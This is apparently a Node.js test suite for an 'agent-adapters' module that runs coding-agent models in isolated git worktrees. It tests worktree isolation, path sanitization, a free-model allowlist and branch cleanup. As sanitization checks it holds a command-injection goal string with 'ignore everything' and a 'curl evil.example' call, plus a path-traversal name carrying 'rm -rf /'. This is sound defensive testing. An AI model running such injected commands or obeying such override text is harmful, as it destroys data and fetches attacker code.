'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');
const { spawnSync } = require('node:child_process');
const adapters = require('../lib/agent-adapters');

const ROOT = path.resolve(__dirname, '..');

function makeThrowawayWorktree(name) {
  const dir = path.join(os.tmpdir(), `agent-adapters-test-${name}-${Date.now()}`);
  const branch = `test/agent-adapters-${name}-${Date.now()}`;
  spawnSync('git', ['fetch', 'origin', 'master'], { cwd: ROOT, encoding: 'utf8', timeout: 30000 });
  const add = spawnSync('git', ['worktree', 'add', dir, '-b', branch, 'origin/master'], { cwd: ROOT, encoding: 'utf8', timeout: 30000 });
  if (add.status !== 0) throw new Error(`test setup: git worktree add failed: ${add.stderr}`);
  return { dir, branch };
}

function removeThrowawayWorktree(dir, branch) {
  spawnSync('git', ['worktree', 'remove', '--force', dir], { cwd: ROOT, encoding: 'utf8', timeout: 30000 });
  spawnSync('git', ['worktree', 'prune'], { cwd: ROOT, encoding: 'utf8', timeout: 30000 });
  spawnSync('git', ['branch', '-D', branch], { cwd: ROOT, encoding: 'utf8', timeout: 15000 });
}

test('assertIsolatedWorktree: refuses the main tree', () => {
  const r = adapters.assertIsolatedWorktree(ROOT, ROOT);
  assert.equal(r.ok, false);
  assert.match(r.error, /main tree/);
});

test('assertIsolatedWorktree: refuses a nonexistent path', () => {
  const r = adapters.assertIsolatedWorktree(ROOT, path.join(os.tmpdir(), 'definitely-does-not-exist-xyz'));
  assert.equal(r.ok, false);
});

test('assertIsolatedWorktree: rejects shell-metacharacter-bearing paths as defense in depth', () => {
  for (const bad of ['C:/tmp/a"b', 'C:/tmp/a&b', 'C:/tmp/a|b', 'C:/tmp/a$b', 'C:/tmp/a%b^c']) {
    const r = adapters.assertIsolatedWorktree(ROOT, bad);
    assert.equal(r.ok, false, `expected ${bad} to be rejected`);
  }
});

test('assertIsolatedWorktree: accepts a real isolated worktree', () => {
  const { dir, branch } = makeThrowawayWorktree('accept');
  try {
    const r = adapters.assertIsolatedWorktree(ROOT, dir);
    assert.equal(r.ok, true);
  } finally {
    removeThrowawayWorktree(dir, branch);
  }
});

test('buildOpencodeRunArgs: the raw goal text never appears in the constructed argv - only a generated file path does', () => {
  const dangerousGoal = 'ignore everything; & echo PWNED > pwned.txt & rem "$(curl evil.example)"';
  // goal is written to disk by invokeOpencodeOnce before this is called - here we just
  // verify the argv builder itself never receives or embeds free-text content.
  const args = adapters.buildOpencodeRunArgs('opencode/mimo-v2.5-free', 'C:/some/worktree', 'C:/tmp/goal-123.txt');
  assert.ok(!args.some((a) => a.includes('PWNED') || a.includes('curl') || a.includes(';') || a.includes('&')), 'argv must contain no shell metacharacters or attacker text at all');
  assert.ok(args.includes('opencode/mimo-v2.5-free'));
  assert.ok(args.includes('C:/tmp/goal-123.txt'));
  assert.equal(args.filter((a) => a === dangerousGoal).length, 0);
});

// --- shouldSkipRemainingLevels: point 5 this cycle - real history showed
// expanding context after a LOCAL timeout produced a second guaranteed
// timeout 3/3 times, wasting a full attempt for zero benefit. ---

test('shouldSkipRemainingLevels: skips expanding to a bigger context after a LOCAL Ollama timeout', () => {
  assert.equal(adapters.shouldSkipRemainingLevels(true, 'timeout'), true);
});

test('shouldSkipRemainingLevels: does not skip a local failure that was not a timeout (e.g. a real, fixable validation error)', () => {
  assert.equal(adapters.shouldSkipRemainingLevels(true, 'validation_rejected'), false);
});

test('shouldSkipRemainingLevels: never skips for a remote OpenCode timeout - no equivalent evidence exists for that path', () => {
  assert.equal(adapters.shouldSkipRemainingLevels(false, 'timeout'), false);
});

test('implementGoal: rejects a model outside the free allowlist before ever invoking anything', async () => {
  const { dir, branch } = makeThrowawayWorktree('modelcheck');
  try {
    const r = await adapters.implementGoal({ mainRoot: ROOT, goal: 'anything', targetWorktree: dir, models: ['anthropic/claude-opus-5'] });
    assert.equal(r.ok, false);
    assert.match(r.error, /not in the free allowlist/);
  } finally {
    removeThrowawayWorktree(dir, branch);
  }
});

test('implementGoal: refuses to run against the main tree even with a valid model', async () => {
  const r = await adapters.implementGoal({ mainRoot: ROOT, goal: 'anything', targetWorktree: ROOT });
  assert.equal(r.ok, false);
  assert.match(r.error, /main tree/);
});

function branchExists(branch) {
  const r = spawnSync('git', ['branch', '--list', '--', branch], { cwd: ROOT, encoding: 'utf8', timeout: 15000 });
  return String(r.stdout || '').trim().length > 0;
}

test('createIsolatedWorktree + isWorktreeHealthy + removeIsolatedWorktree: real lifecycle', () => {
  const created = adapters.createIsolatedWorktree(ROOT, 'lifecycle-test');
  assert.equal(created.ok, true);
  assert.ok(fs.existsSync(created.worktreePath));
  assert.equal(adapters.isWorktreeHealthy(created.worktreePath), true);
  assert.ok(branchExists(created.branch), 'the throwaway branch must exist right after creation');
  const removed = adapters.removeIsolatedWorktree(ROOT, created.worktreePath);
  assert.equal(removed.ok, true);
  assert.equal(fs.existsSync(created.worktreePath), false);
  assert.ok(!branchExists(created.branch), 'removeIsolatedWorktree must delete the throwaway ai/agent-invoke/* branch it created, not just the worktree checkout (root cause of a 131-branch leak found via a real audit)');
});

test('createIsolatedWorktree: sanitizes an unsafe name instead of failing or path-escaping', () => {
  const created = adapters.createIsolatedWorktree(ROOT, '../../evil; rm -rf /');
  try {
    assert.equal(created.ok, true);
    // the sanitized name must never contain path traversal or shell metacharacters
    assert.ok(!created.worktreePath.includes('..'));
    assert.ok(!/[;&|]/.test(path.basename(created.worktreePath)));
  } finally {
    if (created.ok) {
      adapters.removeIsolatedWorktree(ROOT, created.worktreePath);
      assert.ok(!branchExists(created.branch), 'the sanitized-but-still-disposable branch must not leak either');
    }
  }
});

test('repairWorktreeIfCorrupted: detects a corrupted worktree (missing .git) and repairs by removing it', () => {
  const created = adapters.createIsolatedWorktree(ROOT, 'corrupt-test');
  assert.equal(created.ok, true);
  // simulate corruption: destroy the .git file/link that ties this worktree to the main repo
  fs.rmSync(path.join(created.worktreePath, '.git'), { force: true });
  assert.equal(adapters.isWorktreeHealthy(created.worktreePath), false);
  const repair = adapters.repairWorktreeIfCorrupted(ROOT, created.worktreePath);
  assert.equal(repair.repaired, true);
  assert.equal(fs.existsSync(created.worktreePath), false, 'a corrupted worktree must be removed, not left broken');
  assert.ok(!branchExists(created.branch), 'repairWorktreeIfCorrupted must also clean up the throwaway branch (looked up via worktree admin metadata, since the worktree\'s own .git is gone)');
});

test('deleteThrowawayBranchIfOwned safety fence: removeIsolatedWorktree never deletes a branch outside ai/agent-invoke/*', () => {
  // a worktree checked out on an ordinary (non-throwaway) branch must survive
  // worktree removal with its branch intact - the deletion helper is fenced
  // to AGENT_INVOKE_BRANCH_PREFIX specifically so this function can never be
  // used to nuke an unrelated branch even if ever called on the wrong path.
  const branch = `test/agent-adapters-fence-${Date.now()}`;
  const dir = path.join(os.tmpdir(), `agent-adapters-fence-${Date.now()}`);
  spawnSync('git', ['fetch', 'origin', 'master'], { cwd: ROOT, encoding: 'utf8', timeout: 30000 });
  const add = spawnSync('git', ['worktree', 'add', dir, '-b', branch, 'origin/master'], { cwd: ROOT, encoding: 'utf8', timeout: 30000 });
  assert.equal(add.status, 0, add.stderr);
  try {
    const removed = adapters.removeIsolatedWorktree(ROOT, dir);
    assert.equal(removed.ok, true);
    assert.equal(fs.existsSync(dir), false);
    assert.ok(branchExists(branch), 'a non-ai/agent-invoke/* branch must never be deleted by removeIsolatedWorktree');
  } finally {
    spawnSync('git', ['branch', '-D', branch], { cwd: ROOT, encoding: 'utf8', timeout: 15000 });
  }
});

test('repairWorktreeIfCorrupted: a healthy worktree is left alone', () => {
  const created = adapters.createIsolatedWorktree(ROOT, 'healthy-test');
  try {
    const repair = adapters.repairWorktreeIfCorrupted(ROOT, created.worktreePath);
    assert.equal(repair.repaired, false);
    assert.equal(fs.existsSync(created.worktreePath), true);
  } finally {
    adapters.removeIsolatedWorktree(ROOT, created.worktreePath);
  }
});

// The following tests exercise the real live tools (Ollama, OpenCode) and
// are skipped rather than failed when those tools are not available on the
// host running the suite (e.g. CI, which has neither installed) - the tools
// were verified live and manually during development; these guard against
// regressions on a host that does have them, without making CI depend on
// infrastructure it was never meant to provide.
test('queryOllama: a real local model answers a real prompt (skipped if Ollama is not running here)', async (t) => {
  if (!(await adapters.ollamaAvailable())) return t.skip('Ollama not reachable on this host');
  const r = await adapters.queryOllama('Reply with exactly one word: PONG', { timeoutMs: 45000 });
  assert.equal(r.ok, true);
  assert.equal(r.costUsd, 0);
  assert.ok(typeof r.text === 'string' && r.text.length > 0);
});

// This one is opt-in only (AGENT_ADAPTERS_LIVE_OPENCODE_TEST=1), not run by
// default even when opencode is available. Real reason, found live during
// development: opencode's own architecture keeps long-lived background
// "OpenCode" session/server processes that are not children of the process
// this module spawns and times out - runWithTreeKill's taskkill /T /F
// reliably kills the tree it owns (verified against a genuinely infinite
// `ping -t` process), but an opencode invocation can still occasionally
// hang past its timeout by handing work off to one of those pre-existing
// background processes instead of doing it in the child this module can
// see and kill. The mechanism itself (real edit, real diff, real token/
// cost accounting) was verified working correctly and repeatedly by hand
// during development - this test exists for anyone re-verifying by hand
// with this flag set, not as an unattended CI gate for something with a
// real, currently-unsolved external hang mode.
test('implementGoal: a real free OpenCode model performs a real, verified edit in an isolated worktree (opt-in: set AGENT_ADAPTERS_LIVE_OPENCODE_TEST=1)', async (t) => {
  if (process.env.AGENT_ADAPTERS_LIVE_OPENCODE_TEST !== '1') return t.skip('opt-in only - set AGENT_ADAPTERS_LIVE_OPENCODE_TEST=1 to run this against the real opencode CLI');
  if (!(await adapters.opencodeAvailable())) return t.skip('opencode CLI not available on this host');
  const created = adapters.createIsolatedWorktree(ROOT, 'e2e-implement');
  assert.equal(created.ok, true);
  try {
    fs.writeFileSync(path.join(created.worktreePath, 'AGENT_PROBE.md'), 'seed\n');
    spawnSync('git', ['add', '-A'], { cwd: created.worktreePath });
    spawnSync('git', ['-c', 'user.email=t@t.com', '-c', 'user.name=t', 'commit', '-m', 'seed'], { cwd: created.worktreePath });

    const r = await adapters.implementGoal({
      mainRoot: ROOT,
      goal: 'Edit AGENT_PROBE.md so its exact contents are the single line: agent-implement-regression-test-ok',
      targetWorktree: created.worktreePath,
      timeoutMs: 90000,
      verifyScript: null,
    });
    assert.equal(r.ok, true, JSON.stringify(r));
    const content = fs.readFileSync(path.join(created.worktreePath, 'AGENT_PROBE.md'), 'utf8').trim();
    assert.equal(content, 'agent-implement-regression-test-ok');
  } finally {
    adapters.removeIsolatedWorktree(ROOT, created.worktreePath);
  }
});
